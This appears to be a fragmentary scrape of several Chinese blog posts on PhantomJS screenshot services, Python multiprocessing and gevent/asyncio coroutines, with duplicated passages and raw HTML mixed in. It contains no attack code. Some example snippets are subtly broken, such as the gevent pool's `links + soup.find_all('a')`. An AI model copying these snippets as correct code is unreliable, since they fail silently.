url_list:\n     threading.Thread(target=test,args=(url,)).start() \nd.quit()\n```\n　　然而运行连连出错，在查看了官网等资料后发现phantomjs是单线程的，因此如果按照上面的写法，那么不能使用多线程同时去执行，此次优化失败！\n\n#### 不成熟的优化（二）\n既然一个phantomjs只能支持单线程，那么我就开启多个phantomjs。\n```bash\ndef test(url):\n     d=webdriver.PhantomJS()\n     d.get(url)\n     d.quit()\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor url in url_list:\n    threading.Thread(target=test,args=(url,)).start()\n```\n　　终于我看到同时10个phantomjs进程被开启了，10个网站的请求可以并发执行了。然而当网站的数量为50个时，要同时运行50个phantomjs进程？No，这必定会搞垮服务器，此次优化失败！\n\n#### 不成熟的优化（三）\n　　经过以上2次失败，我开始思考，如何只开启10个phantomjs进程，然后每个phantomjs进程按顺序执行请求网站的操作呢?这样就相当于10个进程并发执行了。\n终于在某个夜晚，我想出了以下代码：\n```bash\ndef  test():\n     d=webdriver.PhantomJS()\n     for i in url_list:\n        d.get(url)\n     d.quit()\n\nurl_list=[\"http://www.baidu.com\"]*50\nfor i in range(10):\n     threading.Thread(target=test).start()\n```\n　　成功开启了10个phantomjs进程，每个进程按顺序执行了50个网站的请求。等等，貌似这样设计，每个phantomjs进程都会去访问50次百度，这不是最初的要求，oh，No！\n\n#### 不算成熟但还可以的优化\n　　在第三阶段并发优化的雏形已经出来了，只不过还需要解决一个多线程共享资源的问题，这个可以用Queue模块解决。那么直接看优化后并发的代码：\n```bash\n__author__=\"nMask\"\n__Date__=\"20170224\"\n__Blog__=\"http://thief.one\"\n\nimport Queue\nfrom selenium

抛弃selenium+phantomjs\n　　之前我一直使用selenium去使用phantomjs，原因是因为selenium封装了phantomjs一部分功能，selenium又提供了python的接口模块，在python语言中可以很好地去使用selenium，间接地就可以使用phantomjs。然而，我现在要说的是，是时候抛弃selenium+phantomjs了，原因之一此封装的接口很久没有更新了（没人维护了），原因之二selenium只实现了一部分phantomjs功能，且很不完善。\n\n### phantomjs APi\n　　通过查看phantomjs官方介绍，我们可以发现phantomjs的功能异常强大，绝不仅仅是selenium封装的功能那么简陋。phantomjs提供了很多种APi，具体可以查看：[phantomjs api介绍](http://thief.one/2017/03/13/Phantomjs-Api%E4%BB%8B%E7%BB%8D/)，其中最常用的要属Phantomjs WebService与Phantomjs WebPage，前者用于开启http服务，后者用于发起http请求。\n\n### Phantomjs正确使用方式\n正确打开方式应该使用phantomjs Webservice作为一种web服务的形式（api）,将其与其他语言分离开来（比如python）。\n\n#### 设计流程：\n　　Python通过http请求下发任务，Phantomjs Webservice获取任务后去处理，处理完以后再将结果返回给Python。任务调度、存储等复杂操作交给Python去做，Python可以写成异步并发去请求Phantomjs Webservice，需要注意的是目前一个Phantomjs Webservice只支持10个并发。但我们可以在一台服务器上多开几个phantomjs Webservice启用不同的端口即可，或者可以多台服务器做个集群，用nginx做反向代理。\n\n#### Phantomjs Webservice\n新建test.js，写入如下代码：\n```bash\nvar system=require('system');  //get args\nvar args=system.args;\nif (args.length ===2) {\nvar port=Number(args[1]);\n}else{var port=8080;}\n\nvar webserver = require('webserver');\nvar server = webserver.create()\nvar service = server.listen(port, function(request, response) {\n  try{\n    var postRaw=request.postRaw;\n    var aaa=new Array();\n    aaa=postRaw.split(\"=\");\n    var url=aaa[0];\n    var md5_url=aaa[1];\n    url=decodeURIComponent(url);\n    console.log(url); //输出传入的url\n\n    //获取源码\n    // var webPage = require('webpage');\n    // var page = webPage.create();\n    // page.open(url, function (status) {\n    //   var url = page.url;\n    //   console.log('url: ' + url);  //输入获取到的目标网站title\n    // });\n\n    //页面截图\n    var webPage = require('webpage');\n    var page = webPage.create();\n    page.viewportSize = { width: 1024, height: 768 };\n    // page.settings.resourceTimeout = 5000;//timeout\n    page.open(url, function start(status) {\n      if(status=='success'){\n       /* window.setTimeout(function(){*/\n          page.render('./image/'+md5_url+'.jpg', {format: 'jpg', quality: '100'});\n        // },1000)\n      }\n      else{\n        md5_url=\"error\"; //没有改变全局变量的值\n        // console.log(\"1\"+md5_url);\n      }\n      // console.log(\"2\"+md5_url);\n      //response返回信息\n      response.status=200;\n      response.write(md5_url);\n      page.close();\n      response.close();\n  });\n  }\n  catch(e)\n  {\n    md5_url=\"error\";\n    console.log('error'+e.message+'happen'+e.lineNumber+'line');\n  }\n});\n```\n作用：处理http请求，获取url，进行截图或者获取源码操作。\n使用：\n```bash\nphantomjs.exe test.js 8080\n```\n会在本地开启web服务，端口为8080。\n\n#### Python Client\n新建http_request.py，写入如下代码：\n```bash\n#! -*- coding:utf-8 -*-\n\nimport requests\nimport hashlib\nimport os\nimport base64\nimport sys\n\nclass http_request:\n  port=8080\n\n  def __init__(self):\n    pass\n  def run(self,domain):\n    url=\"http://localhost:\"+str(http_request.port)\n    base_domain=base64.b64encode(domain)\n    md5_domain=hashlib.md5(base_domain).hexdigest()\n    payload={domain:md5_domain}\n\n    if os.path.exists('./image/'+md5_domain+'.jpg')==False:  #如果不存在截图，则进程截图操作\n      try:\n        f=requests.post(url,data=payload)\n      except:\n        sys.exit()\n      image_name=f.content\n      return image_name\n    else:\n      return \"exist\"\n\nif __name__==\"__main__\":\n  cur=http_request()\n  domain_list=[\"\"]\n  for domain in domain_list:\n    print cur.run(domain)\n\n```\n作用：异步并发下发任务。\n\n#### 运行截图\n运行python以后，异步下发10个任务，Phantomjs服务器端接收到url并开始处理，并发处理10个任务并输入结果。\n![](/upload_image/20170331/1.png)\n\n#### 异常处理\n\n现象：截图为黑屏\n原因：网页还没加载完，就开始截图了\n解决：在代码中open以后判断status值，判断网页是否加载完毕。\n\n现象：程序出错--windows报错\n解决：更换最新版本的phantomjs\n\n现象：内存占用过大，导致报错停止phantomjs进程\n原因：phantomjs没有释放内容\n解决：代码中open以后，要open.close();\n\n现象：没有截图成功\n原因：用了page.close，因为onloadfinished是非阻塞的，因此要将page.close放在open代码层内部。\n\n\n>转载请说明出处:[Phantomjs正确打开方式

id=\"抛弃selenium-phantomjs\"><a href=\"#抛弃selenium-phantomjs\" class=\"headerlink\" title=\"抛弃selenium+phantomjs\"></a>抛弃selenium+phantomjs</h3><p>　　之前我一直使用selenium去使用phantomjs，原因是因为selenium封装了phantomjs一部分功能，selenium又提供了python的接口模块，在python语言中可以很好地去使用selenium，间接地就可以使用phantomjs。然而，我现在要说的是，是时候抛弃selenium+phantomjs了，原因之一此封装的接口很久没有更新了（没人维护了），原因之二selenium只实现了一部分phantomjs功能，且很不完善。</p>\n<h3 id=\"phantomjs-APi\"><a href=\"#phantomjs-APi\" class=\"headerlink\" title=\"phantomjs APi\"></a>phantomjs APi</h3><p>　　通过查看phantomjs官方介绍，我们可以发现phantomjs的功能异常强大，绝不仅仅是selenium封装的功能那么简陋。phantomjs提供了很多种APi，具体可以查看：<a href=\"http://thief.one/2017/03/13/Phantomjs-Api%E4%BB%8B%E7%BB%8D/\">phantomjs api介绍</a>，其中最常用的要属Phantomjs WebService与Phantomjs WebPage，前者用于开启http服务，后者用于发起http请求。</p>\n<h3 id=\"Phantomjs正确使用方式\"><a href=\"#Phantomjs正确使用方式\" class=\"headerlink\"

Webservice只支持10个并发。但我们可以在一台服务器上多开几个phantomjs Webservice启用不同的端口即可，或者可以多台服务器做个集群，用nginx做反向代理。</p>\n<h4 id=\"Phantomjs-Webservice\"><a href=\"#Phantomjs-Webservice\" class=\"headerlink\"

phantomjs状态污染测试\n\n#### 测试代码\n```bash\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=['--load-images=no','--disk-cache=yes'])\nd.implicitly_wait(10)        ##设置超时时间\nd.set_page_load_timeout(10)  ##设置超时时间\n\ndef gethttp(url):\n    try:\n        d.get(url)\n    except Exception,e:\n        print e\n\n    print d.current_url\n\n```\n#### 测试（一）\n当我们先用phantomjs运行了cn.bing.com，然后运行123.114.com网站，注意123.114.com是访问不了的.\n```bash\ngethttp(\"http://cn.bing.com\") #网站能正常打开\ngethttp(\"http://123.114.com\") #DNS解析失败，网站打不开\n```\n执行结果：\n```bash\nhttp://cn.bing.com/\nhttp://cn.bing.com/\n```\n可以看到我们获取123.114.com网站的信息时竟然返回了cn.bing.com。\n\n#### 测试（二）\n当我们访问一个网页源码里面带有onbeforeunload元素的网页时。\n```bash\ngethttp(\"http://www.zzxzxyey.com\") #网页内存在onbeforeunload元素\ngethttp(\"http://cn.bing.com\") #网站能正常打开\n```\n执行结果：\n```bash\nhttp://www.zzxzxyey.com/\nhttp://www.zzxzxyey.com/\n```\n可以看到以上2种情况，都会导致phantomjs状态污染，至于其他情况还待后期观察测试。\n\n### 解决方案\n\n#### 彻底法\n每次d.get()请求完就d.quit()关闭phantomjs进程，待到新的请求再开启。（非常耗资源）\n\n#### 普通法\n每次get前去判断url是否能被dns解析，url是否能打开。（也有点耗资源）\n\n#### 优雅法\n每次get后，保存current_url的值，待下一次请求后与此值相比较，如果一样，则说明状态没有被改变。\n（当然，有些特殊情况除外，比如每次get的网站都是同一个，或者批量get的网站中有相同地址的。）\n\n#### 超神法\n每次get一个目标url以后，再去访问下get(“about:blank”)，重置下状态。\n\n###

phantomjs状态污染测试\n\n#### 测试代码\n```bash\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=['--load-images=no','--disk-cache=yes'])\nd.implicitly_wait(10)        ##设置超时时间\nd.set_page_load_timeout(10)  ##设置超时时间\n\ndef gethttp(url):\n    try:\n        d.get(url)\n    except Exception,e:\n        print e\n\n    print d.current_url\n\n```\n#### 测试（一）\n当我们先用phantomjs运行了cn.bing.com，然后运行123.114.com网站，注意123.114.com是访问不了的.\n```bash\ngethttp(\"http://cn.bing.com\") #网站能正常打开\ngethttp(\"http://123.114.com\") #DNS解析失败，网站打不开\n```\n执行结果：\n```bash\nhttp://cn.bing.com/\nhttp://cn.bing.com/\n```\n可以看到我们获取123.114.com网站的信息时竟然返回了cn.bing.com。\n\n#### 测试（二）\n当我们访问一个网页源码里面带有onbeforeunload元素的网页时。\n```bash\ngethttp(\"http://www.zzxzxyey.com\") #网页内存在onbeforeunload元素\ngethttp(\"http://cn.bing.com\") #网站能正常打开\n```\n执行结果：\n```bash\nhttp://www.zzxzxyey.com/\nhttp://www.zzxzxyey.com/\n```\n可以看到以上2种情况，都会导致phantomjs状态污染，至于其他情况还待后期观察测试。\n\n### 解决方案\n\n#### 彻底法\n每次d.get()请求完就d.quit()关闭phantomjs进程，待到新的请求再开启。（非常耗资源）\n\n#### 普通法\n每次get前去判断url是否能被dns解析，url是否能打开。（也有点耗资源）\n\n#### 优雅法\n每次get后，保存current_url的值，待下一次请求后与此值相比较，如果一样，则说明状态没有被改变。\n（当然，有些特殊情况除外，比如每次get的网站都是同一个，或者批量get的网站中有相同地址的。）\n\n#### 超神法\n每次get一个目标url以后，再去访问下get(“about:blank”)，重置下状态。\n\n### 传送门\n\n>[【phantomjs系列】phantomjs正确打开方式](http://thief.one/2017/03/31/Phantomjs%E6%AD%A3%E7%A1%AE%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/)\n[【phantomjs系列】phantomjs

（一）Multiprocessing介绍\n\n##### 为什么要使用python多进程？\n\n　　因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。\n　　如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。\n　　当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。\n\n##### multiprocessing常用组件及功能\n\n创建管理进程模块：\n* [Process](http://thief.one/2016/11/24/Multiprocessing-Process)（用于创建进程模块）\n* [Pool](http://thief.one/2016/11/24/Multiprocessing-Pool)（用于创建管理进程池）\n* Queue（用于进程通信，资源共享）\n* Value，Array（用于进程通信，资源共享）\n* Pipe（用于管道通信）\n* Manager（用于资源共享）\n\n同步子进程模块：\n* Condition\n* Event\n* Lock\n* RLock\n* Semaphore\n\n\n#### （二）Multiprocessing进程管理模块\n\n说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。\n\n##### Process模块\nProcess模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。\n具体介绍请参考：[Process模块介绍](http://thief.one/2016/11/24/Multiprocessing-Process)\n\n##### Pool模块\nPool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。\n具体介绍请参考：[Pool模块介绍](http://thief.one/2016/11/24/Multiprocessing-Pool)\n\n##### Queue模块\nQueue模块用来控制进程安全，与线程中的Queue用法一样。\n\n##### Pipe模块\nPipe模块用来管道操作。\n\n##### Manager模块\nManager模块常与Pool模块一起使用，作用是共享资源。\n\n#### （三）Multiprocessing同步进程模块\n\n##### Lock模块\n\n作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。\n\n具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。\n\n代码实现：\n```bash\nfrom multiprocessing import Process, Lock  \n\ndef l(lock, num):  \n    lock.acquire()  \n    print \"Hello Num: %s\" % (num)  \n    lock.release()  \n\nif __name__ == '__main__':  \n    lock = Lock()  #这个一定要定义为全局\n    for num in range(20):  \n        Process(target=l, args=(lock, num)).start()  #这个类似多线程中的threading，但是进程太多了，控制不了。\n```\n\n##### Semaphore模块\n\n作用：用来控制对共享资源的访问数量，例如池的最大连接数。\n\n##### Event模块\n\n作用：用来实现进程间同步通信。\n\n#### （四）Multiprocessing.dummy多线程\n\nMultiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。\n\n#### （五）使用Multiprocessing疑问\n\n* *启动多进程的代码一定要放在 *if __name__==\"__main__\":* 后面吗？*\n\n　　解答：windows系统下，想要启动一个子进程，必须加上*if __name__==\"__main__\":*，linux则不需要。\n\n* *父进程中的全局变量能被子进程共享吗？*\n\n　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。\n\n* *子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?*\n\n　　解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。\n　　那么问题就又变成了父进程什么时候该结束所有进程？\n　　其中一个思路是*获取每个子进程的返回值*，一旦有返回True（结束的标记），则立马结束所有进程；\n　　另外一种思路是*使用共享资源*，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）\n\n* *子进程中还能再创建子进程吗？*\n\n解答：可以，子进程可以再创建进程，线程中也可以创建进程。\n\n#### （六）多进程资源共享问题\n\n多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。\n\n具体介绍请参考：[多进程资源共享问题](http://thief.one/2016/11/24/Multiprocessing共享资源)\n\n#### （七）获取子进程返回值问题\n\n多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。\n\n具体介绍请参考：[获取子进程返回值问题](http://thief.one/2016/11/24/Multiprocessing子进程返回值)\n\n\n####

-->\n　　对于协程，我表示其效率确非多线程能比，但本人对此了解并不深入，因此最近几日参考了一些资料，学习整理了一番，在此分享出来仅供大家参考，如有谬误请指正，多谢。\n\n申明：*本文介绍的协程是入门级别，大神请绕道而行，谨防入坑。*\n\n文章思路：本文将先介绍协程的概念，然后分别介绍Python2.x与3.x下协程的用法，最终将协程与多线程做比较并介绍异步爬虫模块。\n\n### 协程\n#### 概念\n　　协程，又称微线程，纤程，英文名Coroutine。协程的作用，是在执行函数A时，可以随时中断，去执行函数B，然后中断继续执行函数A（可以自由切换）。但这一过程并不是函数调用（没有调用语句），这一整个过程看似像多线程，然而协程只有一个线程执行。\n#### 优势\n* 执行效率极高，因为子程序切换（函数）不是线程切换，由程序自身控制，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。\n* 不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。\n\n*　　说明：协程可以处理IO密集型程序的效率问题，但是处理CPU密集型不是它的长处，如要充分发挥CPU利用率可以结合多进程+协程。*\n\n　　以上只是协程的一些概念，可能听起来比较抽象，那么我结合代码讲一讲吧。这里主要介绍协程在Python的应用，Python2对协程的支持比较有限，生成器的yield实现了一部分但不完全，gevent模块倒是有比较好的实现；Python3.4以后引入了asyncio模块，可以很好的使用协程。\n\n### Python2.x协程\npython2.x协程应用：\n* yield\n* gevent\n\npython2.x中支持协程的模块不多，gevent算是比较常用的，这里就简单介绍一下gevent的用法。\n#### Gevent\n　　gevent是第三方库，通过greenlet实现协程，其基本思想：\n　　当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。\n##### Install\npip install gevent\n*最新版貌似支持windows了，之前测试好像windows上运行不了......*\n##### Usage\n首先来看一个简单的爬虫例子：\n```bash\n#! -*- coding:utf-8 -*-\n\nimport gevent\nfrom gevent import monkey;monkey.patch_all()\nimport urllib2\n\ndef get_body(i):\n\tprint \"start\",i\n\turllib2.urlopen(\"http://cn.bing.com\")\n\tprint \"end\",i\n\ntasks=[gevent.spawn(get_body,i) for i in range(3)]\ngevent.joinall(tasks)\n```\n运行结果：\n```bash\nstart 0\nstart 1\nstart 2\nend 2\nend 0\nend 1\n```\n　　说明：从结果上来看，执行get_body的顺序应该先是输出\"start\"，然后执行到urllib2时碰到IO堵塞，则会自动切换运行下一个程序（继续执行get_body输出start），直到urllib2返回结果，再执行end。也就是说，程序没有等待urllib2请求网站返回结果，而是直接先跳过了，等待执行完毕再回来获取返回值。值得一提的是，在此过程中，只有一个线程在执行，因此这与多线程的概念是不一样的。\n换成多线程的代码看看:\n```bash\nimport threading\nimport urllib2\n\ndef get_body(i):\n\tprint \"start\",i\n\turllib2.urlopen(\"http://cn.bing.com\")\n\tprint \"end\",i\nfor i in range(3):\n\tt=threading.Thread(target=get_body,args=(i,))\n\tt.start()\n```\n运行结果：\n```bash\nstart 0\nstart 1\nstart 2\nend 1\nend 2\nend 0\n```\n　　说明：从结果来看，多线程与协程的效果一样，都是达到了IO阻塞时切换的功能。不同的是，多线程切换的是线程（线程间切换），协程切换的是上下文（可以理解为执行的函数）。而切换线程的开销明显是要大于切换上下文的开销，因此当线程越多，协程的效率就越比多线程的高。（猜想多进程的切换开销应该是最大的）\n\n##### Gevent使用说明\n* monkey可以使一些阻塞的模块变得不阻塞，机制：遇到IO操作则自动切换，手动切换可以用gevent.sleep(0)（将爬虫代码换成这个，效果一样可以达到切换上下文）\n* gevent.spawn 启动协程，参数为函数名称，参数名称\n* gevent.joinall 停止协程\n\n### Python3.x协程\n为了测试Python3.x下的协程应用，我在virtualenv下安装了python3.6的环境。\npython3.x协程应用：\n* asynico + yield from（python3.4）\n* asynico + await（python3.5）\n* gevent\n\nPython3.4以后引入了asyncio模块，可以很好的支持协程。\n#### asynico\n　　asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。asyncio的异步操作，需要在coroutine中通过yield from完成。\n##### Usage\n例子：（需在python3.4以后版本使用）\n```bash\nimport asyncio\n\n@asyncio.coroutine\ndef test(i):\n\tprint(\"test_1\",i)\n\tr=yield from asyncio.sleep(1)\n\tprint(\"test_2\",i)\n\nloop=asyncio.get_event_loop()\ntasks=[test(i) for i in range(5)]\nloop.run_until_complete(asyncio.wait(tasks))\nloop.close()\n```\n运行结果：\n```bash\ntest_1 3\ntest_1 4\ntest_1 0\ntest_1 1\ntest_1 2\ntest_2 3\ntest_2 0\ntest_2 2\ntest_2 4\ntest_2 1\n```\n　　说明：从运行结果可以看到，跟gevent达到的效果一样，也是在遇到IO操作时进行切换（所以先输出test_1，等test_1输出完再输出test_2）。但此处我有一点不明，test_1的输出为什么不是按照顺序执行的呢？可以对比gevent的输出结果（希望大神能解答一下）。\n##### asyncio说明\n　　@asyncio.coroutine把一个generator标记为coroutine类型，然后，我们就把这个coroutine扔到EventLoop中执行。\n　　test()会首先打印出test_1，然后，yield from语法可以让我们方便地调用另一个generator。由于asyncio.sleep()也是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()返回时，线程就可以从yield from拿到返回值（此处是None），然后接着执行下一行语句。\n　　把asyncio.sleep(1)看成是一个耗时1秒的IO操作，在此期间，主线程并未等待，而是去执行EventLoop中其他可以执行的coroutine了，因此可以实现并发执行。\n#### asynico/await\n　　为了简化并更好地标识异步IO，从Python 3.5开始引入了新的语法async和await，可以让coroutine的代码更简洁易读。\n　　请注意，async和await是针对coroutine的新语法，要使用新的语法，只需要做两步简单的替换：\n* 把@asyncio.coroutine替换为async；\n* 把yield from替换为await。\n\n##### Usage\n例子（python3.5以后版本使用）：\n```bash\nimport asyncio\n\nasync def test(i):\n\tprint(\"test_1\",i)\n\tawait asyncio.sleep(1)\n\tprint(\"test_2\",i)\n\nloop=asyncio.get_event_loop()\ntasks=[test(i) for i in range(5)]\nloop.run_until_complete(asyncio.wait(tasks))\nloop.close()\n```\n运行结果与之前一致。\n说明：与前一节相比，这里只是把yield from换成了await，@asyncio.coroutine换成了async，其余不变。\n#### gevent\n同python2.x用法一样。\n### 协程VS多线程\n　　如果通过以上介绍，你已经明白多线程与协程的不同之处，那么我想测试也就没有必要了。因为当线程越来越多时，多线程主要的开销花费在线程切换上，而协程是在一个线程内切换的，因此开销小很多，这也许就是两者性能的根本差异之处吧。（个人观点）\n### 异步爬虫\n　　也许关心协程的朋友，大部分是用其写爬虫（因为协程能很好的解决IO阻塞问题），然而我发现常用的urllib、requests无法与asyncio结合使用，可能是因为爬虫模块本身是同步的（也可能是我没找到用法）。那么对于异步爬虫的需求，又该怎么使用协程呢？或者说怎么编写异步爬虫？\n给出几个我所了解的方案：\n* grequests （requests模块的异步化）\n* 爬虫模块+gevent（比较推荐这个）\n* aiohttp （这个貌似资料不多，目前我也不太会用）\n* asyncio内置爬虫功能 （这个也比较难用）\n\n### 协程池\n作用：控制协程数量\n```bash\nfrom bs4 import BeautifulSoup\n\nimport requests\n\nimport gevent\n\nfrom gevent import monkey, pool\n\nmonkey.patch_all()\n\njobs = []\n\nlinks = []\n\np = pool.Pool(10)\n\nurls = [\n\n    'http://www.google.com',\n\n    # ... another 100 urls\n\n]\n\ndef get_links(url):\n\n    r = requests.get(url)\n\n    if r.status_code == 200:\n\n        soup = BeautifulSoup(r.text)\n\n        links + soup.find_all('a')\n\n\nfor url in urls:\n\n    jobs.append(p.spawn(get_links, url))\n\ngevent.joinall(jobs)\n```\n\n\n*本文没有太多的干货，都是一些自学时的笔记，分享给新手朋友，仅供参考*\n\n文章学习通道：\n* [Python多进程](http://thief.one/2016/11/23/Python-multiprocessing/)\n*

monkey, pool\n\nmonkey.patch_all()\n\njobs = []\n\nlinks = []\n\np = pool.Pool(10)\n\nurls = [\n\n    'http://www.google.com',\n\n    # ... another 100 urls\n\n]\n\ndef get_links(url):\n\n    r =

href=\"#Gevent\" class=\"headerlink\" title=\"Gevent\"></a>Gevent</h4><p>　　gevent是第三方库，通过greenlet实现协程，其基本思想：<br>　　当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。</p>\n<h5 id=\"Install\"><a href=\"#Install\" class=\"headerlink\" title=\"Install\"></a>Install</h5><p>pip install gevent<br><em>最新版貌似支持windows了，之前测试好像windows上运行不了……</em></p>\n<h5 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage\"></a>Usage</h5><p>首先来看一个简单的爬虫例子：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div

<span class=\"string\">\"end\"</span>,i</div><div class=\"line\"></div><div class=\"line\">tasks=[gevent.spawn(get_body,i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(3)]</div><div class=\"line\">gevent.joinall(tasks)</div></pre></td></tr></table></figure></p>\n<p>运行结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div

1</div></pre></td></tr></table></figure></p>\n<p>　　说明：从结果上来看，执行get_body的顺序应该先是输出”start”，然后执行到urllib2时碰到IO堵塞，则会自动切换运行下一个程序（继续执行get_body输出start），直到urllib2返回结果，再执行end。也就是说，程序没有等待urllib2请求网站返回结果，而是直接先跳过了，等待执行完毕再回来获取返回值。值得一提的是，在此过程中，只有一个线程在执行，因此这与多线程的概念是不一样的。<br>换成多线程的代码看看:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div

id=\"asyncio说明\"><a href=\"#asyncio说明\" class=\"headerlink\" title=\"asyncio说明\"></a>asyncio说明</h5><p>　　@asyncio.coroutine把一个generator标记为coroutine类型，然后，我们就把这个coroutine扔到EventLoop中执行。<br>　　test()会首先打印出test_1，然后，yield from语法可以让我们方便地调用另一个generator。由于asyncio.sleep()也是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()返回时，线程就可以从yield from拿到返回值（此处是None），然后接着执行下一行语句。<br>　　把asyncio.sleep(1)看成是一个耗时1秒的IO操作，在此期间，主线程并未等待，而是去执行EventLoop中其他可以执行的coroutine了，因此可以实现并发执行。</p>\n<h4 id=\"asynico-await\"><a href=\"#asynico-await\" class=\"headerlink\" title=\"asynico/await\"></a>asynico/await</h4><p>　　为了简化并更好地标识异步IO，从Python 3.5开始引入了新的语法async和await，可以让coroutine的代码更简洁易读。<br>　　请注意，async和await是针对coroutine的新语法，要使用新的语法，只需要做两步简单的替换：</p>\n<ul>\n<li>把@asyncio.coroutine替换为async；</li>\n<li>把yield from替换为await。</li>\n</ul>\n<h5

from拿到返回值（此处是None），然后接着执行下一行语句。<br>　　把asyncio.sleep(1)看成是一个耗时1秒的IO操作，在此期间，主线程并未等待，而是去执行EventLoop中其他可以执行的coroutine了，因此可以实现并发执行。</p>\n<h4 id=\"asynico-await\"><a href=\"#asynico-await\"

class=\"blockquote-center\">术业有专攻，如是而已</blockquote>\n当初在刚学习python多线程时，上网搜索资料几乎都是一片倒的反应python没有真正意义上的多线程，python多线程就是鸡肋。当时不明所以，只是了解到python带有GIL解释器锁的概念，同一时刻只能有一个线程在运行，遇到IO操作才会释放切换。那么，python多线程是否真的很鸡肋呢？要解决这个疑惑，我想必须亲自动手测试。\n<!--more -->\n　　经过对比python与java的多线程测试，我发现python多线程的效率确实不如java，但远还没有达到鸡肋的程度，那么跟其他机制相比较呢？\n### 观点：用多进程替代多线程需求\n　　辗转了多篇博文，我看到了一些网友的观点，觉得应该使用python多进程来代替多线程的需求，因为多进程不受GIL的限制。于是我便动手使用多进程去解决一些并发问题，期间也遇到了一些坑，所幸大部分查找资料解决了，然后对多进程做了简单汇总介绍[Python多进程](http://thief.one/2016/11/23/Python-multiprocessing/)。\n　　那么是否多进程能完全替代多线程呢？别急，我们继续往下看。\n### 观点：协程为最佳方案\n　　协程的概念目前来说是比较火热的，协程不同于线程的地方在于协程不是操作系统进行切换，而是由程序员编码进行切换的，也就是说切换是由程序员控制的，这样就没有了线程所谓的安全问题。协程的概念非常广而深，本文暂不做具体介绍，以后会单独成文。\n### 测试数据\n　　好了，网上的观点无非是使用多进程或者协程来代替多线程（当然换编程语言，换解释器之类方法除外），那么我们就来测试下这三者的性能之差。既然要公平测试，就应该考虑IO密集型与CPU密集型的问题，所以分两组数据进行测试。\n#### IO密集型测试\n　　测试IO密集型，我选择最常用的爬虫功能，计算爬虫访问bing所需要的时间。（主要测试多线程与协程，单线程与多进程就不测了，因为没有必要）\n测试代码：\n```bash\n#! -*- coding:utf-8 -*-\n\nfrom gevent import monkey;monkey.patch_all()\nimport gevent\nimport time\nimport threading\nimport urllib2\n\ndef urllib2_(url):\n\ttry:\n\t\turllib2.urlopen(url,timeout=10).read()\n\texcept Exception,e:\n\t\tprint e\n\ndef gevent_(urls):\n\tjobs=[gevent.spawn(urllib2_,url) for url in urls]\n\tgevent.joinall(jobs,timeout=10)\n\tfor i in jobs:\n\t\ti.join()\n\ndef thread_(urls):\n\ta=[]\n\tfor url in urls:\n\t\tt=threading.Thread(target=urllib2_,args=(url,))\n\t\ta.append(t)\n\n\tfor i in a:\n\t\ti.start()\n\tfor i in a:\n\t\ti.join()\n\nif __name__==\"__main__\":\n\turls=[\"https://www.bing.com/\"]*10      \n\tt1=time.time()\n\tgevent_(urls)\n\tt2=time.time()\n\tprint 'gevent-time:%s' % str(t2-t1)\n\tthread_(urls)\n\tt4=time.time()\n\tprint 'thread-time:%s' % 